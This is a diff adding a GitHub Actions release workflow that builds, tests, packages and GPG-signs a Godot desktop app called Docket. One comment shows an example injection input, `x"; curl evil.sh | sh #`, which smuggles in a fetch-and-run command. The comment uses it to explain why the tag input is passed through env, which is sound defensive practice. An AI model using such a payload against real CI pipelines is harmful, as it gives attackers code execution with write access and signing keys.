@@ -1,0 +1,289 @@
+name: Release
+
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: "Tag to build (e.g. v0.1.0)"
+        required: true
+
+env:
+  GODOT_VERSION: "4.6.2"
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    name: ${{ matrix.name }}
+    runs-on: ${{ matrix.os }}
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - name: macOS (universal)
+            os: macos-latest
+            platform: macos
+            arch: universal
+            preset: macOS
+          - name: Linux (x86_64)
+            os: ubuntu-latest
+            platform: linux
+            arch: x86_64
+            preset: Linux
+          - name: Windows (x86_64)
+            os: windows-latest
+            platform: windows
+            arch: x86_64
+            preset: Windows
+
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          submodules: recursive
+
+      - name: Install SCons
+        run: pipx install scons
+
+      - name: Cache godot-cpp objects
+        uses: actions/cache@v4
+        with:
+          path: |
+            third_party/godot-sqlite/godot-cpp/bin
+            third_party/godot-sqlite/godot-cpp/gen
+            third_party/godot-sqlite/.sconsign.dblite
+          key: godot-cpp-${{ matrix.platform }}-${{ matrix.arch }}-${{ hashFiles('.gitmodules') }}-${{ hashFiles('third_party/godot-sqlite/godot-cpp/SConstruct') }}
+
+      # Windows runners have bash via Git for Windows, so one script covers all
+      # three platforms. MSVC is already on the image and SCons finds it.
+      # Both targets: release goes into the exported app, debug is what the
+      # Godot tool binary loads for the pre-release test run below.
+      - name: Build GDExtension from source
+        shell: bash
+        run: ./scripts/build/build_gdextension.sh ${{ matrix.platform }} ${{ matrix.arch }} all
+
+      - name: Preflight checks
+        shell: bash
+        run: ./scripts/build/preflight.sh
+
+      - name: Install Godot + export templates
+        shell: bash
+        run: |
+          set -euo pipefail
+          BASE="https://github.com/godotengine/godot/releases/download/${GODOT_VERSION}-stable"
+          mkdir -p ~/godot-bin && cd ~/godot-bin
+
+          case "${{ runner.os }}" in
+            macOS)   curl -fSL -o godot.zip "$BASE/Godot_v${GODOT_VERSION}-stable_macos.universal.zip" ;;
+            Linux)   curl -fSL -o godot.zip "$BASE/Godot_v${GODOT_VERSION}-stable_linux.x86_64.zip" ;;
+            Windows) curl -fSL -o godot.zip "$BASE/Godot_v${GODOT_VERSION}-stable_win64.exe.zip" ;;
+          esac
+          unzip -q godot.zip && rm godot.zip
+
+          # Export templates must sit where Godot looks for them, keyed by version.
+          curl -fSL -o templates.tpz "$BASE/Godot_v${GODOT_VERSION}-stable_export_templates.tpz"
+          case "${{ runner.os }}" in
+            macOS)   TPL_DIR="$HOME/Library/Application Support/Godot/export_templates/${GODOT_VERSION}.stable" ;;
+            Windows) TPL_DIR="$APPDATA/Godot/export_templates/${GODOT_VERSION}.stable" ;;
+            *)       TPL_DIR="$HOME/.local/share/godot/export_templates/${GODOT_VERSION}.stable" ;;
+          esac
+          mkdir -p "$TPL_DIR"
+          unzip -q templates.tpz -d /tmp/tpl
+          mv /tmp/tpl/templates/* "$TPL_DIR"/
+          rm -rf templates.tpz /tmp/tpl
+
+      - name: Resolve Godot path
+        shell: bash
+        run: |
+          set -euo pipefail
+          case "${{ runner.os }}" in
+            macOS)   GODOT_BIN="$HOME/godot-bin/Godot.app/Contents/MacOS/Godot" ;;
+            Windows) GODOT_BIN="$(find "$HOME/godot-bin" -maxdepth 1 -name 'Godot_v*.exe' | head -1)" ;;
+            *)       GODOT_BIN="$(find "$HOME/godot-bin" -maxdepth 1 -name 'Godot_v*' -type f | head -1)" ;;
+          esac
+          chmod +x "$GODOT_BIN" || true
+          echo "GODOT_BIN=$GODOT_BIN" >> "$GITHUB_ENV"
+
+      - name: Import project
+        shell: bash
+        run: '"$GODOT_BIN" --headless --path . --import 2>&1 | tail -20 || true'
+
+      - name: Run tests before shipping
+        shell: bash
+        run: |
+          set -euo pipefail
+          "$GODOT_BIN" --headless --path . -- test 2>&1 | tee test-output.txt
+          grep -q "ALL TESTS PASSED" test-output.txt
+
+      - name: Export ${{ matrix.preset }}
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p build/${{ matrix.platform }}
+          # --export-release fails the build on export errors; --headless keeps
+          # it non-interactive. The preset name must match export_presets.cfg.
+          "$GODOT_BIN" --headless --path . --export-release "${{ matrix.preset }}" 2>&1 | tail -30
+
+      # macOS: Godot ad-hoc signs during export (codesign/codesign=1), which is
+      # what lets the binary run on Apple Silicon at all. It is NOT notarized —
+      # see docs/SIGNING.md for what users must do on first launch.
+      - name: Verify macOS ad-hoc signature
+        if: matrix.platform == 'macos'
+        run: |
+          set -euo pipefail
+          codesign -dv --verbose=2 build/macos/Docket.app 2>&1 | tee sig.txt
+          grep -q "adhoc\|Signature=adhoc" sig.txt || echo "WARNING: bundle may be unsigned"
+
+      # godot-sqlite and godot-cpp are MIT: their copyright notice must ship with
+      # any binary that includes them, and we compile both into the app. Built
+      # from the vendored trees so it cannot drift from what was actually linked.
+      - name: Collect third-party licenses
+        shell: bash
+        run: |
+          set -euo pipefail
+          OUT=THIRD-PARTY-LICENSES.txt
+          {
+            echo "Docket bundles the following third-party components."
+            echo "Docket itself is licensed under MPL-2.0; see LICENSE."
+            echo
+            echo "================================================================"
+            echo "godot-sqlite — https://github.com/2shady4u/godot-sqlite"
+            echo "vendored at $(git -C third_party/godot-sqlite rev-parse HEAD)"
+            echo "================================================================"
+            cat third_party/godot-sqlite/LICENSE.md
+            echo
+            echo "================================================================"
+            echo "godot-cpp — https://github.com/godotengine/godot-cpp"
+            echo "vendored at $(git -C third_party/godot-sqlite/godot-cpp rev-parse HEAD)"
+            echo "================================================================"
+            cat third_party/godot-sqlite/godot-cpp/LICENSE.md
+          } > "$OUT"
+          echo "wrote $OUT ($(wc -l < "$OUT") lines)"
+
+      # INPUT_TAG goes through env, never interpolated into the script body.
+      # `${{ github.event.inputs.tag }}` written inline is substituted before bash
+      # sees it, so a dispatch input like `x"; curl evil.sh | sh #` executes — in
+      # a job holding contents:write and the signing key. Via env it is only ever
+      # a shell variable's value.
+      - name: Package
+        shell: bash
+        env:
+          INPUT_TAG: ${{ github.event.inputs.tag }}
+        run: |
+          set -euo pipefail
+          VERSION="${GITHUB_REF_NAME:-$INPUT_TAG}"
+          mkdir -p dist
+
+          case "${{ matrix.platform }}" in
+            macos)
+              # A plain zip preserves the bundle and its ad-hoc signature. A .dmg
+              # would need signing to avoid an extra Gatekeeper prompt, so it buys
+              # nothing while we ship unsigned.
+              #
+              # Licences sit NEXT TO the .app, never inside it. Adding any file to
+              # a signed bundle invalidates the seal ("a sealed resource is missing
+              # or invalid"), and on Apple Silicon a broken signature means the app
+              # will not launch at all.
+              STAGE="build/macos/stage"
+              mkdir -p "$STAGE"
+              cp -R build/macos/Docket.app "$STAGE/"
+              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json "$STAGE/"
+              ditto -c -k --sequesterRsrc "$STAGE" "dist/docket-${VERSION}-macos-universal.zip"
+              # The copy must still verify — catches any accidental mutation.
+              codesign --verify --deep "$STAGE/Docket.app"
+              ;;
+            linux)
+              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json build/linux/
+              tar -czf "dist/docket-${VERSION}-linux-x86_64.tar.gz" -C build/linux .
+              ;;
+            windows)
+              cp README.md LICENSE THIRD-PARTY-LICENSES.txt docs/sbom.cdx.json build/windows/
+              cd build/windows && 7z a -tzip "../../dist/docket-${VERSION}-windows-x86_64.zip" . && cd ../..
+              ;;
+          esac
+          ls -la dist/
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: docket-${{ matrix.platform }}
+          path: dist/*
+          if-no-files-found: error
+
+  publish:
+    name: Sign checksums and publish release
+    needs: build
+    runs-on: ubuntu-latest
+    # Job-level env, deliberately: a step's own `env:` block is NOT visible to
+    # that step's `if:` expression, so gating on it there silently evaluates to
+    # false and skips signing without failing the build.
+    env:
+      GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+      GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Download all artifacts
+        uses: actions/download-artifact@v4
+        with:
+          path: artifacts
+          merge-multiple: true
+
+      - name: Generate SHA256SUMS
+        run: |
+          set -euo pipefail
+          cd artifacts
+          sha256sum * > SHA256SUMS
+          cat SHA256SUMS
+
+      # The GPG signature is the only real integrity guarantee we ship, since
+      # the binaries themselves are unsigned. Users verify against the key
+      # fingerprint published in the README.
+      - name: Warn if signing key is absent
+        if: env.GPG_PRIVATE_KEY == ''
+        run: |
+          echo "::warning title=Unsigned release::GPG_PRIVATE_KEY secret is not set — publishing SHA256SUMS without a signature. See docs/SIGNING.md."
+
+      - name: Import GPG signing key
+        if: env.GPG_PRIVATE_KEY != ''
+        run: |
+          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
+          gpg --list-secret-keys
+
+      - name: Sign SHA256SUMS
+        if: env.GPG_PRIVATE_KEY != ''
+        run: |
+          set -euo pipefail
+          cd artifacts
+          echo "$GPG_PASSPHRASE" | gpg --batch --yes --pinentry-mode loopback \
+            --passphrase-fd 0 --armor --detach-sign SHA256SUMS
+          gpg --verify SHA256SUMS.asc SHA256SUMS
+
+      - name: Publish GitHub release
+        # Third-party action running in a job with contents:write and access to
+        # the signing key. Pinned to a commit SHA: a tag can be moved by whoever
+        # controls that repo, which would hand them both.
+        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65  # v2
+        with:
+          tag_name: ${{ github.ref_name || github.event.inputs.tag }}
+          files: artifacts/*
+          generate_release_notes: true
+          body: |
+            ## Install
+
+            Binaries are **unsigned**. Verify them before running:
+
+            ```bash
+            gpg --verify SHA256SUMS.asc SHA256SUMS
+            sha256sum -c SHA256SUMS --ignore-missing
+            ```
+
+            **macOS** — the app is ad-hoc signed but not notarized. On first launch,
+            right-click the app and choose *Open*, then confirm. See `docs/SIGNING.md`.
+
+            **Windows** — SmartScreen will warn that the publisher is unrecognized.
+            Choose *More info* → *Run anyway*.
+
+            **Linux** — extract and run `./docket.x86_64`.
